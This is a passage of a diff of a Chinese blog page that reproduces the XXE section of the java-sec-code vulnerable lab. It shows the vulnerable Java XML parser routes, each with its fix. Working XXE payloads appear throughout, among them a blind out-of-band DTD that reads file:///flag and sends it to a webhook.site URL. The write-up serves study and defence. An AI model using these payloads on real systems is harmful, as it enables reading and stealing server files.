class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>换用 SAXReader 第三方库，攻击手法同上：</p>
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131638014.png" alt="image-20250713163801721" /></p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131638654.png" alt="image-20250713163814551" /></p>
+<p>只能用来读文件，而且还不回显，有点难受</p>
+<h4 id="修复代码"><a class="anchor" href="#修复代码">#</a> 修复代码：</h4>
+<p>竟然都是外部实体造成的问题，直接禁用就好了</p>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/sec"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderSec</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe security code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="3路由xxesaxreadervuln"><a class="anchor" href="#3路由xxesaxreadervuln">#</a> 3. 路由 /xxe/SAXReader/vuln</h3>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cause xxe</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload 一样，也是没有任何防御，该类有回显</p>
+<h3 id="通用的做法"><a class="anchor" href="#通用的做法">#</a> 通用的做法：</h3>
+<h4 id="external-dtd外部-dtd-参数实体parameter-entity实现的-blind-xxe-外带攻击"><a class="anchor" href="#external-dtd外部-dtd-参数实体parameter-entity实现的-blind-xxe-外带攻击">#</a> External DTD（外部 DTD）+ 参数实体（Parameter Entity）实现的 Blind XXE 外带攻击</h4>
+<p>在主 xml 里面写：</p>
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset"></pre></td></tr><tr><td data-num="3"></td><td><pre>  &lt;!ENTITY % dtd SYSTEM "http://192.168.159.1:8000/1.dtd"></pre></td></tr><tr><td data-num="4"></td><td><pre>  %dtd;</pre></td></tr><tr><td data-num="5"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>在这个服务器上起一个 http 服务：</p>
+<pre><code>python -m http.server 8000
 </code></pre>
+<p>然后再起的服务下面创建一个 dtd 文件，在 dtd 文件里面搞一个</p>
+<pre><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e?d=%file;'&gt;&quot;&gt;
+%all;
+</code></pre>
+<p>xml 这个东西感觉可以学学</p>
+<p>感觉都差不多，直接发送请求</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507181631168.png" alt="image-20250718163104944" /></p>
+<p>看一下有没有外带数据，有了</p>
+<p><img data-src="C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250718162847835.png" alt="image-20250718162847835" /></p>
+<h3 id="4路由xxesaxparservuln"><a class="anchor" href="#4路由xxesaxparservuln">#</a> 4. 路由 /xxe/SAXParser/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
+    public String SAXParserVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser parser = spf.newSAXParser();
+            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
+
+            return &quot;SAXParser xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+java复制代码12345678910111213141516
+</code></pre>
+<h3 id="5路由xxedigestervuln"><a class="anchor" href="#5路由xxedigestervuln">#</a> 5. 路由 /xxe/Digester/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
+    public String DigesterVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            Digester digester = new Digester();
+            digester.parse(new StringReader(body));  // parse xml
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+        return &quot;Digester xxe vuln code&quot;;
+    &#125;
+java复制代码1234567891011121314
+</code></pre>
+<h3 id="6路由xxedocumentbuildervuln"><a class="anchor" href="#6路由xxedocumentbuildervuln">#</a> 6. 路由 /xxe/DocumentBuilder/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            InputSource is = new InputSource(request.getInputStream());
+            Document document = db.parse(is);  // parse xml
+
+            // 遍历xml节点name和value
+            StringBuilder buf = new StringBuilder();
+            NodeList rootNodeList = document.getChildNodes();
+            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
+                Node rootNode = rootNodeList.item(i);
+                NodeList child = rootNode.getChildNodes();
+                for (int j = 0; j &lt; child.getLength(); j++) &#123;
+                    Node node = child.item(j);
+                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
+                &#125;
+            &#125;
+            return buf.toString();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+            logger.error(e.toString());
+            return e.toString();
+        &#125;
+    &#125;
+java复制代码1234567891011121314151617181920212223242526
+</code></pre>
+<p>这是 JDK 自带的类，以此产生的 XXE 是存在回显的</p>
+<h3 id="7路由xxedocumentbuilderxincludevuln"><a class="anchor" href="#7路由xxedocumentbuilderxincludevuln">#</a> 7. 路由 /xxe/DocumentBuilder/xinclude/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            dbf.setXIncludeAware(true);   // 支持XInclude
+            dbf.setNamespaceAware(true);  // 支持XInclude
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            StringReader sr = new StringReader(body);
+            InputSource is = new InputSource(sr);
+            Document document = db.parse(is);  // parse xml
+
+            NodeList rootNodeList = document.getChildNodes();
+            response(rootNodeList);
+
+            sr.close();
+            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+Java复制代码123456789101112131415161718192021222324
+</code></pre>
+<h3 id="8路由xxexmlreadervuln"><a class="anchor" href="#8路由xxexmlreadervuln">#</a> 8. 路由 /xxe/XMLReader/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>@PostMapping(&quot;/XMLReader/vuln&quot;)
+    public String XMLReaderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser saxParser = spf.newSAXParser();
+            XMLReader xmlReader = saxParser.getXMLReader();
+            xmlReader.parse(new InputSource(new StringReader(body)));
+
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;XMLReader xxe vuln code&quot;;
+    &#125;
+java复制代码123456789101112131415161718
+</code></pre>
+<h3 id="9路由xxedocumenthelpervuln"><a class="anchor" href="#9路由xxedocumenthelpervuln">#</a> 9. 路由 /xxe/DocumentHelper/vuln</h3>
+<p>漏洞代码：</p>
+<pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
+    public String DocumentHelper(HttpServletRequest req) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(req);
+            DocumentHelper.parseText(body); // parse xml
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;DocumentHelper xxe vuln code&quot;;
+    &#125;
+
+
+    private static void response(NodeList rootNodeList)&#123;
+        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
+            Node rootNode = rootNodeList.item(i);
+            NodeList xxe = rootNode.getChildNodes();
+            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;
+                Node xxeNode = xxe.item(j);
+                // 测试不能blind xxe，所以强行加了一个回显
+                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
+            &#125;
+
+        &#125;
+    &#125;
+复制代码1234567891011121314151617181920212223242526
+</code></pre>
+<p>修复该漏洞只需升级 dom4j 到 2.1.1 及以上，该版本及以上禁用了 ENTITY，不带 ENTITY 的 PoC 不能利用，所以禁用 ENTITY 即可完成修复。</p>
+<h3 id="上述存在xxe漏洞库对比"><a class="anchor" href="#上述存在xxe漏洞库对比">#</a> 上述存在 XXE 漏洞库对比</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>工具 / 类</strong></th>
+<th style="text-align:left"><strong>简介</strong></th>
+<th style="text-align:left"><strong>使用场景</strong></th>
+<th style="text-align:left"><strong>优点</strong></th>
+<th style="text-align:left"><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>xmlReader</code></td>
+<td style="text-align:left">SAX 的接口，基于事件驱动的解析</td>
+<td style="text-align:left">处理大型 XML 文件</td>
+<td style="text-align:left">内存占用小，速度快</td>
+<td style="text-align:left">需要手动管理上下文，处理复杂结构困</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>SAXBuilder</code></td>
+<td style="text-align:left">JDOM 中基于 SAX 的解析器</td>
+<td style="text-align:left">需要用 JDOM 处理 XML 数据时</td>
+<td style="text-align:left">结合了 SAX 的高效性和 JDOM 的易用性</td>
+<td style="text-align:left">解析速度依赖于 SAX，灵活性低于 DOM</td>
+</tr>
+<tr>
+<td style="text-align:left">SAXReader`       | Dom4j 中基于 SAX 的解析器                                | 需要 Dom4j 进行 XML 操作时                    | 高效且灵活，支持树结构              | 性能略逊于纯 SAX                     |</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>SAXParser</code></td>
+<td style="text-align:left">Java 中的 SAX 解析器</td>
+<td style="text-align:left">基于事件驱动的解析，适合处理大型 XML 文件</td>
+<td style="text-align:left">高效，内存占用小</td>
+<td style="text-align:left">解析复杂 XML 需要手动处理回调</td>
+</tr>
+<tr>
+<td style="text-align:left">Digester`        | 基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供） | 需要将 XML 映射为 Java 对象时                 | 简化 XML 与 Java 对象的映射         | 对大文件不友好，灵活性较低           |</td>
+</tr>
+<tr>
+<td style="text-align:left">DocumentBuilder` | Java 中 DOM 解析器，用于构建树状结构                     | 需要完整树结构操作，如修改和多次遍历 XML 文件 | 完整保留文档结构，易于查找和修改    | 内存占用较大，处理大文件时性能较差   |</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>DocumentHelper</code></td>
+<td style="text-align:left">Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td>
+<td style="text-align:left">需要手动构建和操作 XML 文档时</td>
+<td style="text-align:left">快速创建和处理 XML 文档，灵活性高</td>
+<td style="text-align:left">内存占用较大，处理超大文件时性能不佳</td>
+</tr>
+</tbody>
+</table>
+<h4 id="统一漏洞利用payload"><a class="anchor" href="#统一漏洞利用payload">#</a> 统一漏洞利用 payload：</h4>
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "	https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h4 id="统一修复代码"><a class="anchor" href="#统一修复代码">#</a> 统一修复代码：</h4>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 实例化解析类之后通常会支持着三个配置</span></pre></td></tr><tr><td data-num="2"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>仅用了外部实体，限制实体来源</p>
 
   </div>
 
@@ -628,7 +897,7 @@ String template：要评估的模板字符串
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2025-07-11 20:46:32" itemprop="dateModified" datetime="2025-07-11T20:46:32+08:00">2025-07-11</time>
+    <time title="Modified: 2025-07-18 18:07:56" itemprop="dateModified" datetime="2025-07-18T18:07:56+08:00">2025-07-18</time>
   </span>
   <span id="2025/07/08/java-sec-code复现/" class="item leancloud_visitors" data-flag-title="java-sec-code复现" title="Views">
       <span class="icon">
@@ -691,7 +960,7 @@ String template：要评估的模板字符串
     <div class="item left">
       
 
-  <a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?61877" title="ecshop复现">
+  <a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?406863" title="ecshop复现">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>ecshop复现</h3>
@@ -701,7 +970,7 @@ String template：要评估的模板字符串
     <div class="item right">
       
 
-  <a href="/2025/07/11/YLctf2024/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?181587" title="Untitled">
+  <a href="/2025/07/11/YLctf2024/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?280932" title="Untitled">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Untitled</h3>
@@ -723,7 +992,7 @@ String template：要评估的模板字符串
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-sec-code%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text"> java-sec-code 靶场复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdinject"><span class="toc-number">1.1.</span> <span class="toc-text"> Cmdinject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject"><span class="toc-number">1.1.1.</span> <span class="toc-text"> &#x2F;codeinject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#start%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> start（）函数详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%8A%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text"> 1. 把命令参数转换为字符串数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text"> 2. 参数检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%90%8D%E5%91%BD%E4%BB%A4%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text"> 3. 获取要执行的程序名（命令第一个元素）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text"> 4. 安全管理器检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text"> 5. 获取执行目录路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E4%B8%AD%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E9%9D%9E%E6%B3%95%E7%9A%84%E7%A9%BA%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.1.1.6.</span> <span class="toc-text"> 6. 检查命令参数中是否含有非法的空字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.1.1.7.</span> <span class="toc-text"> 7. 启动进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinjecthost"><span class="toc-number">1.1.2.</span> <span class="toc-text"> &#x2F;codeinject&#x2F;host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-number">1.2.</span> <span class="toc-text"> jsonp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.</span> <span class="toc-text"> 文件上传：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.4.</span> <span class="toc-text"> 目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#raw-sql"><span class="toc-number">1.5.0.1.</span> <span class="toc-text"> raw sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-preparestatement"><span class="toc-number">1.5.0.2.</span> <span class="toc-text"> Incorrect prepareStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-mybatis"><span class="toc-number">1.5.0.3.</span> <span class="toc-text"> Incorrect mybatis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.0.3.1.</span> <span class="toc-text"> 防护方案：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">1.6.</span> <span class="toc-text"> ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1ssrfurlconnectionvuln"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1. 路由 &#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1ssrfhttpurlconnectionvuln"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 路由 